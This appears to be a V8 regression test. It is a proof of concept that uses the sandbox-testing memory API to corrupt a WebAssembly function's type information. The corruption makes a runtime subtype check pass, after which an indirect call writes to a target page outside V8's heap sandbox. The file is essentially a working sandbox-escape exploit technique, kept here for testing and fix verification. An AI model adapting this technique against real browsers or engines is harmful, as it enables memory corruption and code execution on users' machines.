// --sandbox-testing
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// module 0
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []), kNoSuperType, false);
let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let $sig_r_v = builder.addType(kSig_r_v);
let $writer = builder.addFunction("writer", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $boom = builder.addFunction("boom", $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprI32Const, 0,
    kExprCallIndirect, $sig_v_ll, 0,
  ]);
let $get_writer = builder.addFunction("get_writer", kSig_r_v)
  .exportFunc()
  .addBody([
    kExprRefFunc, $writer.index,
    kGCPrefix, kExprStructNew, $box,
    kGCPrefix, kExprExternConvertAny,
  ]);
let $get_boom = builder.addFunction("get_boom", kSig_r_v)
  .exportFunc()
  .addBody([
    kExprRefFunc, $boom.index,
    kGCPrefix, kExprStructNew, $box,
    kGCPrefix, kExprExternConvertAny,
  ]);
let $table =
  builder.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, $writer.index]).exportAs("table");

let instance = builder.instantiate();
let { writer, boom, get_writer, get_boom } = instance.exports;

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kStructField0Offset = 8;
const kMapOffset = 0;
const kFuncRefMapTypeInfoOffset = 0x14;
const kTypeInfoSupertypesOffset = 0x14;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let boxed_writer = get_writer();                                          // WASM_STRUCT_TYPE
let funcref_writer = getField(getPtr(boxed_writer), kStructField0Offset); // WASM_FUNC_REF_TYPE
let map_v_ls = getField(funcref_writer, kMapOffset);                      // Map of WASM_FUNC_REF_TYPE
let typeinfo_v_ls = getField(map_v_ls, kFuncRefMapTypeInfoOffset);        // WASM_TYPE_INFO_TYPE

let boxed_boom = get_boom();
let funcref_boom = getField(getPtr(boxed_boom), kStructField0Offset);
let map_v_ll = getField(funcref_boom, kMapOffset);

// typeinfo_v_ls.supertypes[0] = map_v_ll
setField(typeinfo_v_ls, kTypeInfoSupertypesOffset, map_v_ll);

// rtt subtype check success
boom(BigInt(Sandbox.targetPage) - 0x7n, 0x42n);